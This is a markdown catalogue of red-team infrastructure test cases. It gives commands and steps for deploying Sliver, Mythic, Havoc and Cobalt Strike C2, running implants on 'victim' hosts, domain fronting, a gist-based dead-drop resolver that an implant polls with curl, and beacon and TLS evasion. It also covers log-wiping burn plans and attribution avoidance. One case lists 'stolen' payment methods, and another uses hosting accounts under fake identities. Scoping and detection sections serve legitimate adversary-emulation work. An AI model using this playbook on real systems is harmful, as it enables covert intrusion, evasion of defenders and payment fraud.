# Red Team Infrastructure — Test Cases

> Structured test cases for red team infrastructure engagements. Each case covers a specific infrastructure capability, with objective, prerequisites, test steps, expected results, severity, remediation, and pass criteria. Use during scoping, deployment, operation, and validation phases.

## Section A — Infrastructure deployment

### TC-RT-001 — Sliver C2 deployment with HTTPS listener

**Objective**: Verify Sliver C2 can be deployed with HTTPS listener and beacon from implant.

**Severity**: Critical

**Prerequisite**:
- Target VPS with Ubuntu 22.04
- Domain pointing to VPS
- Let's Encrypt cert installed

**Test Step**:
1. SSH to VPS
2. Install Sliver: `curl https://sliver.sh/install | sudo bash`
3. Start server: `sliver`
4. Create listener: `http --domain c2.example.com --web-port 8443`
5. Generate implant: `generate --http https://c2.example.com --os linux`
6. Execute implant on victim host
7. Verify beacon check-in via `beacons` command

**Expected Result**: Implant beacons to Sliver server within 30 seconds.

**Pass Criteria**: Beacon appears in Sliver session list.

**Remediation**: Check firewall rules, TLS cert, and DNS resolution.

---

### TC-RT-002 — Mythic C2 deployment with Apollo agent

**Objective**: Verify Mythic C2 framework can be deployed with Apollo agent and HTTP profile.

**Severity**: Critical

**Prerequisite**:
- VPS with Docker installed
- 4GB RAM minimum
- Domain pointing to VPS

**Test Step**:
1. Clone Mythic: `git clone https://github.com/its-a-feature/Mythic`
2. Run installer: `sudo ./install_docker_ubuntu.sh`
3. Configure `.env` file
4. Start: `sudo ./mythic-cli start`
5. Install Apollo: `sudo ./mythic-cli install github https://github.com/MythicAgents/Apollo`
6. Install HTTP profile: `sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http`
7. Rebuild: `sudo ./mythic-cli rebuild`
8. Generate payload via web UI
9. Execute on victim

**Expected Result**: Apollo implant beacons via HTTP profile within 60 seconds.

**Pass Criteria**: Mythic UI shows new callback.

**Remediation**: Check Docker containers, agent logs, profile config.

---

### TC-RT-003 — Havoc C2 deployment with HTTP listener

**Objective**: Verify Havoc C2 can be deployed and implants can beacon via HTTPS.

**Severity**: Critical

**Prerequisite**:
- VPS with Go 1.20+ installed
- Domain + TLS cert

**Test Step**:
1. Clone Havoc: `git clone https://github.com/HavocFramework/Havoc`
2. Build teamserver: `cd Havoc/teamserver && go build -o Havoc teamserver.go`
3. Build client: `cd ../client && make`
4. Start teamserver: `./Havoc -t Alpha`
5. Connect via client
6. Create HTTP listener
7. Generate Windows EXE implant
8. Execute on victim
9. Verify beacon

**Expected Result**: Havoc implant beacons to teamserver within 30 seconds.

**Pass Criteria**: Demon agent appears in Havoc GUI session list.

**Remediation**: Check listener config, firewall, port binding.

---

### TC-RT-004 — Multi-tier redirector chain deployment

**Objective**: Verify 3-tier redirector chain (Cloudflare → Worker → Nginx mTLS) hides true C2.

**Severity**: High

**Prerequisite**:
- Cloudflare account
- Worker script
- Nginx server with mTLS config
- C2 backend (Sliver / Mythic)

**Test Step**:
1. Deploy Cloudflare worker (filters POST + X-Implant-Auth header)
2. Deploy Nginx mTLS redirector (validates client cert)
3. Configure C2 backend
4. Generate implant targeting Cloudflare worker URL
5. Execute implant on victim
6. Verify traffic flows: implant → worker → Nginx → C2
7. Verify non-implant traffic is blocked

**Expected Result**: Implant reaches C2 backend; non-implant traffic gets 404.

**Pass Criteria**: Backend logs show beacon; Nginx logs show only mTLS-authenticated requests.

**Remediation**: Verify cert chain, worker filter, Nginx ssl_verify_client.

---

### TC-RT-005 — Nginx mTLS certificate validation

**Objective**: Verify Nginx mTLS correctly authenticates implant certs and rejects unauthorized clients.

**Severity**: Critical

**Prerequisite**:
- Nginx server with mTLS config
- CA + client cert + key
- Test host without client cert

**Test Step**:
1. Generate CA: `openssl req -new -x509 -days 3650 -key ca.key -out ca.crt -subj "/CN=RedTeam CA"`
2. Generate client cert signed by CA
3. Configure Nginx: `ssl_client_certificate /etc/nginx/mtls/ca.crt; ssl_verify_client on;`
4. Test without client cert: `curl -v https://redirector.example.com/`
5. Test with client cert: `curl --cert client.crt --key client.key https://redirector.example.com/api/`
6. Test with wrong CA cert: should be rejected

**Expected Result**: Without cert → 400 Bad Request; with valid cert → 200 OK; with invalid cert → 400.

**Pass Criteria**: Only valid CA-signed certs pass mTLS handshake.

**Remediation**: Verify ssl_client_certificate path, cert chain, serial file.

---

## Section B — Domain + DNS operations

### TC-RT-006 — Domain portfolio tiering

**Objective**: Verify domain portfolio can be tiered (tier-1 throwaway, tier-2 business, tier-3 long-lived) with appropriate categorization.

**Severity**: Medium

**Prerequisite**:
- Multiple domains registered
- Categorization check tooling

**Test Step**:
1. Register 3 tier-1 domains (.xyz, $1 each)
2. Register 2 tier-2 domains (.com, 1+ year old, $20+)
3. Register 1 tier-3 domain (.com, 5+ year old, $50+)
4. Check categorization via Bluecoat / Fortiguard / VT
5. Check domain age via whois

**Expected Result**: Tier-1 domains uncategorized; tier-2 mostly categorized; tier-3 has good reputation.

**Pass Criteria**: Categorization report shows tier progression.

**Remediation**: Submit to categorization services for legitimate-looking content.

---

### TC-RT-007 — Cloudflare worker redirector deployment

**Objective**: Verify Cloudflare worker correctly filters + forwards C2 traffic.

**Severity**: High

**Prerequisite**:
- Cloudflare account
- Worker CLI (wrangler)
- C2 backend

**Test Step**:
1. Install wrangler: `npm install -g wrangler`
2. Init worker: `wrangler init`
3. Configure worker.js to filter POST + X-Implant-Auth header
4. Deploy: `wrangler deploy`
5. Test from implant with header: should pass
6. Test from browser without header: should return 404

**Expected Result**: Implant traffic passes; non-implant gets 404.

**Pass Criteria**: Worker logs show only authenticated POSTs forwarded.

**Remediation**: Check worker.js syntax, Cloudflare route, custom domain.

---

### TC-RT-008 — Domain fronting via Cloudflare

**Objective**: Verify domain fronting works (SNI shows legit customer, Host header routes to attacker origin).

**Severity**: High

**Prerequisite**:
- Cloudflare customer domain (legitimate-look)
- Attacker origin (Cloudflare-fronted)
- Test host with curl

**Test Step**:
1. Identify legitimate Cloudflare customer domain (e.g., cdn.example-customer.com)
2. Configure attacker origin (hidden-c2.example.com) on Cloudflare
3. From victim: `curl -H "Host: hidden-c2.example.com" https://cdn.example-customer.com/`
4. Verify request reaches attacker origin
5. Verify SWG log shows only SNI (cdn.example-customer.com)

**Expected Result**: Request reaches attacker origin; SWG sees only legitimate SNI.

**Pass Criteria**: Backend log shows POST; SWG log shows only cdn.example-customer.com.

**Remediation**: Verify Cloudflare routing rules; not all customers support fronting.

---

### TC-RT-009 — Dead-drop resolver via GitHub gist

**Objective**: Verify GitHub gist can serve as dead-drop resolver for C2 IP distribution.

**Severity**: Medium

**Prerequisite**:
- GitHub account with PAT
- Implant with curl
- C2 IP rotation plan

**Test Step**:
1. Create gist with C2 IP: `echo "203.0.113.10" | gist -f config.txt -d "config"`
2. Capture gist ID
3. Implant polls: `curl -s https://gist.githubusercontent.com/$USER/$GIST_ID/raw/config.txt`
4. Rotate IP: update gist via PATCH API
5. Verify implant picks up new IP on next poll

**Expected Result**: Implant always knows current C2 IP; rotation is transparent.

**Pass Criteria**: Implant beacon switches to new IP within poll interval.

**Remediation**: Verify gist is public-readable; verify PAT has gist scope.

---

### TC-RT-010 — Certificate automation with Let's Encrypt

**Objective**: Verify Let's Encrypt certs can be auto-issued and rotated for redirector.

**Severity**: High

**Prerequisite**:
- Domain on Cloudflare
- Certbot installed
- Cloudflare API token

**Test Step**:
1. Install certbot + Cloudflare plugin
2. Configure ~/.cloudflare.ini with API token
3. Issue wildcard cert: `certbot certonly --dns-cloudflare --dns-cloudflare-credentials ~/.cloudflare.ini -d '*.redirector.example.com'`
4. Configure auto-renew: `systemctl enable --now certbot.timer`
5. Test renewal: `certbot renew --dry-run`
6. Verify Nginx uses new cert

**Expected Result**: Wildcard cert issued; auto-renewal scheduled.

**Pass Criteria**: Cert valid for 90 days; renewal timer active.

**Remediation**: Verify Cloudflare token has Zone.DNS edit scope.

---

## Section C — OPSEC + compartmentalization

### TC-RT-011 — Account separation verification

**Objective**: Verify each infrastructure team uses separate hosting accounts, payment methods, and SSH keys.

**Severity**: Critical

**Prerequisite**:
- 5+ VPS instances across teams
- SSH key audit tooling

**Test Step**:
1. List all VPS instances per team
2. Verify each team uses unique hosting provider
3. Verify each team uses unique payment method (crypto / prepaid / stolen)
4. Verify each team uses unique SSH key
5. Generate MD5 hash of each SSH key for audit

**Expected Result**: No cross-contamination between teams.

**Pass Criteria**: Account matrix shows full separation.

**Remediation**: Re-key any duplicate SSH keys; migrate accounts with shared payment.

---

### TC-RT-012 — Burn plan execution

**Objective**: Verify burn plan can be executed end-to-end (teardown + cert revoke + IP rotation).

**Severity**: High

**Prerequisite**:
- Live C2 infrastructure
- Terraform + certbot + GitHub PAT
- Burn script

**Test Step**:
1. Execute burn.sh
2. Verify all services stopped
3. Verify certs revoked
4. Verify logs wiped
5. Verify VPS destroyed (Terraform destroy)
6. Verify domains migrated
7. Verify dead-drop resolver updated with new IP
8. Verify burned assets logged

**Expected Result**: Full teardown + rebuild in <1 hour.

**Pass Criteria**: No infrastructure fingerprint remains.

**Remediation**: Document burn procedure; rehearse quarterly.

---

### TC-RT-013 — VirusTotal monitoring

**Objective**: Verify VT monitoring detects domain flagging within 1 hour.

**Severity**: High

**Prerequisite**:
- Active C2 domain
- VT API key
- Monitoring script

**Test Step**:
1. Deploy C2 with new domain
2. Run monitoring script hourly
3. Manually submit domain to VT
4. Verify monitoring script detects flag

**Expected Result**: Detection within 1 hour of flag.

**Pass Criteria**: Alert fires; burn plan triggered.

**Remediation**: Tune VT polling interval; add additional feeds (Cisco Umbrella, Bluecoat).

---

### TC-RT-014 — Implant TLS JA3 fingerprinting

**Objective**: Verify implant's TLS JA3 fingerprint matches expected browser fingerprint.

**Severity**: Medium

**Prerequisite**:
- Sliver implant with custom TLS profile
- JA3 fingerprint analyzer

**Test Step**:
1. Capture implant TLS handshake (tcpdump)
2. Compute JA3 hash from ClientHello
3. Compare against known browser JA3 (Chrome 120 / Firefox 120)
4. Verify match within tolerance

**Expected Result**: Implant JA3 matches expected browser JA3.

**Pass Criteria**: JA3 hash equal to expected value.

**Remediation**: Use Sliver's `--user-agent` + custom TLS profile; switch to implant with browser-mimic TLS stack.

---

### TC-RT-015 — Beacon cadence randomization

**Objective**: Verify beacon cadence is randomized to defeat interval-based detection.

**Severity**: Medium

**Prerequisite**:
- Sliver implant with jitter config
- 24-hour beacon capture

**Test Step**:
1. Configure implant with 30s sleep + 30% jitter
2. Capture beacon timestamps for 24 hours
3. Compute inter-arrival variance
4. Compare against detection threshold

**Expected Result**: Inter-arrival variance > 0.3 (random pattern).

**Pass Criteria**: No periodic pattern detectable.

**Remediation**: Increase jitter percentage; add gaussian distribution.

---

## Section D — Multi-platform + cloud-native

### TC-RT-016 — AWS Lambda-based redirector

**Objective**: Verify AWS Lambda can serve as serverless C2 redirector (no static IP).

**Severity**: Medium

**Prerequisite**:
- AWS account
- Lambda function + API Gateway
- C2 backend

**Test Step**:
1. Create Lambda function (Python)
2. Configure to forward POST requests to C2 backend
3. Set up API Gateway as HTTP trigger
4. Configure custom domain via ACM
5. Test from implant

**Expected Result**: Implant beacons via Lambda → API Gateway → C2 backend.

**Pass Criteria**: Backend receives beacon; Lambda logs show invocation.

**Remediation**: Check IAM role, API Gateway route, custom domain.

---

### TC-RT-017 — Azure Functions-based redirector

**Objective**: Verify Azure Functions can serve as serverless C2 redirector.

**Severity**: Medium

**Prerequisite**:
- Azure account
- Function app + storage account
- Custom domain

**Test Step**:
1. Create Function app
2. Deploy HTTP trigger function (Python)
3. Configure to forward to C2 backend
4. Set custom domain via Azure DNS
5. Test from implant

**Expected Result**: Implant beacons via Azure Function → C2 backend.

**Pass Criteria**: Backend receives beacon; Application Insights shows invocation.

**Remediation**: Verify Function auth level, networking, custom domain binding.

---

### TC-RT-018 — Google Cloud Functions-based redirector

**Objective**: Verify GCP Cloud Functions can serve as serverless C2 redirector.

**Severity**: Medium

**Prerequisite**:
- GCP account
- Cloud Function with HTTP trigger
- Custom domain via Cloud CDN

**Test Step**:
1. Deploy Cloud Function (Python)
2. Configure HTTP trigger
3. Set custom domain via Load Balancer
4. Configure Function to forward to C2 backend
5. Test from implant

**Expected Result**: Implant beacons via GCP Function → C2 backend.

**Pass Criteria**: Backend receives beacon; Function logs show invocation.

**Remediation**: Verify IAM, Cloud Load Balancer config, custom domain.

---

### TC-RT-019 — WireGuard VPN between C2 + redirector

**Objective**: Verify WireGuard VPN provides encrypted hop between C2 backend and redirector.

**Severity**: Medium

**Prerequisite**:
- C2 backend VPS
- Redirector VPS
- WireGuard installed on both

**Test Step**:
1. Generate WireGuard keys on both hosts
2. Configure WireGuard interface on both
3. Set up tunnel: redirector → C2 backend
4. Configure Nginx to proxy via WireGuard IP
5. Test from implant

**Expected Result**: Implant traffic flows over encrypted WireGuard tunnel.

**Pass Criteria**: Nginx log shows source = WireGuard IP; tcpdump shows encrypted tunnel.

**Remediation**: Verify WireGuard config, peer keys, allowed IPs.

---

### TC-RT-020 — Multi-VPS Terraform deployment

**Objective**: Verify Terraform can deploy multi-VPS C2 infrastructure end-to-end.

**Severity**: High

**Prerequisite**:
- Terraform installed
- DO/Vultr/Hetzner API tokens
- SSH key

**Test Step**:
1. Configure terraform.tfvars with API tokens
2. Run `terraform init`
3. Run `terraform apply -auto-approve`
4. Verify all VPS deployed
5. Run Ansible playbook to install C2 + redirector
6. Test full chain

**Expected Result**: 5+ VPS deployed with C2 + redirector chain.

**Pass Criteria**: Terraform state shows all resources; Ansible playbook succeeds.

**Remediation**: Verify API tokens, SSH key ID, region availability.

---

## Section E — Detection + response validation

### TC-RT-021 — Detection via domain categorization

**Objective**: Verify defender can detect uncategorized C2 domains via categorization feeds.

**Severity**: High

**Prerequisite**:
- Live C2 domain
- Bluecoat / Fortiguard / VT access
- SOC monitoring

**Test Step**:
1. Deploy C2 with new domain (uncategorized)
2. Submit to Fortiguard categorization
3. Wait for SOC detection (or non-detection)
4. Document time-to-detect

**Expected Result**: SOC detects uncategorized domain within 24 hours.

**Pass Criteria**: Detection time documented; if not detected, gap documented.

**Remediation**: Tune SWG to alert on uncategorized domains.

---

### TC-RT-022 — Detection via beacon cadence anomaly

**Objective**: Verify defender can detect C2 beaconing via cadence analysis.

**Severity**: High

**Prerequisite**:
- Live implant beaconing
- Zeek / Suricata on defender side
- Beacon analyzer

**Test Step**:
1. Deploy Sliver implant with 30s + 30% jitter cadence
2. Beacon for 24 hours
3. Run Zeek beacon analyzer on traffic
4. Document detection (or non-detection)

**Expected Result**: Beacon detected by Zeek within 24 hours.

**Pass Criteria**: Detection time documented; if not detected, gap documented.

**Remediation**: Tune Zeek beacon analyzer; lower jitter threshold.

---

### TC-RT-023 — Detection via TLS JA3 fingerprinting

**Objective**: Verify defender can detect C2 implant via non-standard JA3 hash.

**Severity**: Medium

**Prerequisite**:
- Live implant beaconing
- JA3 analyzer on defender side
- Known JA3 blacklist

**Test Step**:
1. Deploy implant with default Sliver JA3
2. Beacon for 24 hours
3. Run JA3 analyzer
4. Compare against known C2 JA3 blacklist
5. Document detection

**Expected Result**: JA3 analyzer flags implant within 24 hours.

**Pass Criteria**: Detection time documented.

**Remediation**: Switch to implant with browser-mimic TLS stack.

---

### TC-RT-024 — CDN-fronted traffic detection

**Objective**: Verify defender can detect C2 hidden behind CDN (SNI ≠ Host header delta).

**Severity**: High

**Prerequisite**:
- Domain-fronted implant
- SWG with TLS inspection
- SNI/Host delta analyzer

**Test Step**:
1. Deploy implant using domain fronting (Cloudflare → attacker origin)
2. Beacon for 24 hours
3. Run SNI/Host delta analyzer on SWG logs
4. Document detection

**Expected Result**: Delta analyzer flags implant within 24 hours.

**Pass Criteria**: Detection documented.

**Remediation**: Configure SWG to alert on SNI ≠ Host header delta.

---

### TC-RT-025 — Operator attribution avoidance

**Objective**: Verify operator identity is not leaked through infrastructure (registrant, payment, hosting).

**Severity**: Critical

**Prerequisite**:
- Live infrastructure
- WHOIS / payment / hosting audit

**Test Step**:
1. Check WHOIS for redaction (privacy service)
2. Check payment method for non-attribution (crypto)
3. Check hosting account for fake identity
4. Check SSH key for engagement-specific generation
5. Verify no operator PII in any infrastructure

**Expected Result**: No operator PII discoverable.

**Pass Criteria**: All audit checks pass.

**Remediation**: Migrate to privacy-respecting providers; rotate identities.

---

## Section F — Engagement lifecycle

### TC-RT-026 — Engagement scoping + ROE

**Objective**: Verify engagement scope + ROE are documented and approved before any deployment.

**Severity**: Critical

**Prerequisite**:
- Customer signed engagement letter
- Scope doc + ROE template

**Test Step**:
1. Document engagement scope (target, channels, duration)
2. Document ROE (allowed/disallowed techniques)
3. Document test boundaries
4. Customer sign-off
5. Internal review (legal + ops)

**Expected Result**: Signed scope + ROE before infrastructure deployment.

**Pass Criteria**: Documentation complete + signed.

**Remediation**: Re-scope or escalate to legal if unclear.

---

### TC-RT-027 — Infrastructure deployment timeline

**Objective**: Verify infrastructure can be deployed within agreed timeline (≤4 hours).

**Severity**: Medium

**Prerequisite**:
- Terraform + Ansible playbooks ready
- Domain portfolio pre-staged
- VPS accounts ready

**Test Step**:
1. Start clock
2. Execute Terraform apply
3. Execute Ansible deploy
4. Verify C2 reachable
5. Stop clock

**Expected Result**: Deployment in ≤4 hours.

**Pass Criteria**: Timeline met.

**Remediation**: Pre-stage frequently used VPS images; automate more.

---

### TC-RT-028 — Engagement monitoring

**Objective**: Verify real-time monitoring detects infrastructure detection (VT flag, SOC alert).

**Severity**: High

**Prerequisite**:
- VT monitoring script
- SOC communication channel
- Burn plan ready

**Test Step**:
1. Deploy C2
2. Start VT monitoring
3. Wait for SOC communication
4. Document any detections
5. Execute burn plan if needed

**Expected Result**: All detections documented within 1 hour of occurrence.

**Pass Criteria**: Monitoring coverage ≥95% of engagement.

**Remediation**: Tune monitoring; add additional feeds.

---

### TC-RT-029 — Engagement cleanup + burn

**Objective**: Verify all infrastructure can be cleaned up within 1 hour of engagement end.

**Severity**: High

**Prerequisite**:
- Live infrastructure
- Burn script ready
- Documentation template

**Test Step**:
1. Stop all C2 services
2. Revoke all certs
3. Wipe all logs
4. Destroy all VPS (Terraform destroy)
5. Migrate all domains
6. Update dead-drop resolver
7. Document burned assets

**Expected Result**: Cleanup within 1 hour; no infrastructure fingerprint remains.

**Pass Criteria**: Burn log complete; all assets documented.

**Remediation**: Automate more cleanup steps.

---

### TC-RT-030 — Engagement reporting

**Objective**: Verify final report documents infrastructure, detections, and gaps.

**Severity**: Medium

**Prerequisite**:
- Engagement complete
- Detection logs
- SOC feedback

**Test Step**:
1. Compile infrastructure timeline
2. Document detection events (or non-detection)
3. Document detection gaps
4. Author Sigma rules for gaps
5. Submit report to customer
6. Schedule SOC handoff

**Expected Result**: Report covers all infrastructure, detections, and gaps.

**Pass Criteria**: Customer sign-off on report.

**Remediation**: Re-interview SOC; add detail to gaps.

---

## Section G — Product-specific

### TC-RT-031 — Cloudflare Workers OPSEC test

**Objective**: Verify Cloudflare Workers correctly filter traffic and avoid detection.

**Severity**: High

**Prerequisite**:
- Cloudflare account
- Worker deployed
- Implant with header filter

**Test Step**:
1. Configure worker to filter POST + X-Implant-Auth header
2. Test from implant: should pass
3. Test from curl without header: should 404
4. Verify Cloudflare analytics only show POST traffic
5. Verify no Cloudflare flag

**Expected Result**: Implant traffic passes; non-implant blocked.

**Pass Criteria**: Worker logs show only authenticated traffic.

**Remediation**: Verify worker filter logic.

---

### TC-RT-032 — Nginx rate limiting test

**Objective**: Verify Nginx rate limiting prevents volume-based detection.

**Severity**: Medium

**Prerequisite**:
- Nginx with rate limiting config
- Implant with high-volume beacon
- Detection tooling

**Test Step**:
1. Configure Nginx limit_req_zone
2. Generate high-volume implant beacon
3. Verify Nginx returns 429 for excess traffic
4. Implant backs off per 429

**Expected Result**: Nginx throttles beacon; implant adapts.

**Pass Criteria**: Nginx log shows 429 responses; implant log shows backoff.

**Remediation**: Tune limit_req values; configure implant backoff.

---

### TC-RT-033 — Cobalt Strike malleable C2 profile test

**Objective**: Verify CS malleable C2 profile evades signature-based detection.

**Severity**: High

**Prerequisite**:
- CS teamserver + license
- Malleable C2 profile
- Detection signatures

**Test Step**:
1. Author custom malleable C2 profile (mimic legitimate API)
2. Lint profile: `./c2lint custom.profile`
3. Deploy teamserver with profile
4. Generate beacon
5. Test against detection signatures

**Expected Result**: Beacon evades signatures.

**Pass Criteria**: No signature matches.

**Remediation**: Refine profile; add more legitimate-looking fields.

---

### TC-RT-034 — Operator console OPSEC

**Objective**: Verify operator console (Sliver / Mythic) does not leak metadata.

**Severity**: Medium

**Prerequisite**:
- Operator console deployed
- Network capture tooling

**Test Step**:
1. Capture operator console traffic (between operator + C2)
2. Verify traffic is encrypted (TLS / SSH)
3. Verify no plaintext metadata
4. Verify no telemetry sent to vendor

**Expected Result**: All console traffic encrypted.

**Pass Criteria**: No plaintext observed in capture.

**Remediation**: Use SSH tunneling for console; verify TLS cert.

---

### TC-RT-035 — Cross-engagement infrastructure isolation

**Objective**: Verify infrastructure from engagement A cannot be linked to engagement B.

**Severity**: Critical

**Prerequisite**:
- Two completed engagements
- Audit tooling

**Test Step**:
1. Audit engagement A's infrastructure (domains, IPs, accounts)
2. Audit engagement B's infrastructure
3. Verify no overlap (no shared domains, IPs, accounts, SSH keys, payment methods)

**Expected Result**: No cross-engagement linkage.

**Pass Criteria**: Audit shows zero overlap.

**Remediation**: Re-key; rebuild from scratch if any overlap found.

---

## Test Case Index

| ID | Title | Severity |
|----|-------|----------|
| TC-RT-001 | Sliver C2 deployment | Critical |
| TC-RT-002 | Mythic C2 deployment | Critical |
| TC-RT-003 | Havoc C2 deployment | Critical |
| TC-RT-004 | 3-tier redirector chain | High |
| TC-RT-005 | Nginx mTLS cert validation | Critical |
| TC-RT-006 | Domain portfolio tiering | Medium |
| TC-RT-007 | Cloudflare worker redirector | High |
| TC-RT-008 | Domain fronting via Cloudflare | High |
| TC-RT-009 | Dead-drop resolver (gist) | Medium |
| TC-RT-010 | Let's Encrypt automation | High |
| TC-RT-011 | Account separation | Critical |
| TC-RT-012 | Burn plan execution | High |
| TC-RT-013 | VT monitoring | High |
| TC-RT-014 | TLS JA3 fingerprinting | Medium |
| TC-RT-015 | Beacon cadence randomization | Medium |
| TC-RT-016 | AWS Lambda redirector | Medium |
| TC-RT-017 | Azure Functions redirector | Medium |
| TC-RT-018 | GCP Cloud Functions redirector | Medium |
| TC-RT-019 | WireGuard VPN hop | Medium |
| TC-RT-020 | Terraform multi-VPS | High |
| TC-RT-021 | Detection via categorization | High |
| TC-RT-022 | Detection via beacon cadence | High |
| TC-RT-023 | Detection via JA3 | Medium |
| TC-RT-024 | CDN-fronted detection | High |
| TC-RT-025 | Operator attribution avoidance | Critical |
| TC-RT-026 | Engagement scoping + ROE | Critical |
| TC-RT-027 | Deployment timeline | Medium |
| TC-RT-028 | Engagement monitoring | High |
| TC-RT-029 | Cleanup + burn | High |
| TC-RT-030 | Engagement reporting | Medium |
| TC-RT-031 | Cloudflare Workers OPSEC | High |
| TC-RT-032 | Nginx rate limiting | Medium |
| TC-RT-033 | CS malleable C2 profile | High |
| TC-RT-034 | Operator console OPSEC | Medium |
| TC-RT-035 | Cross-engagement isolation | Critical |
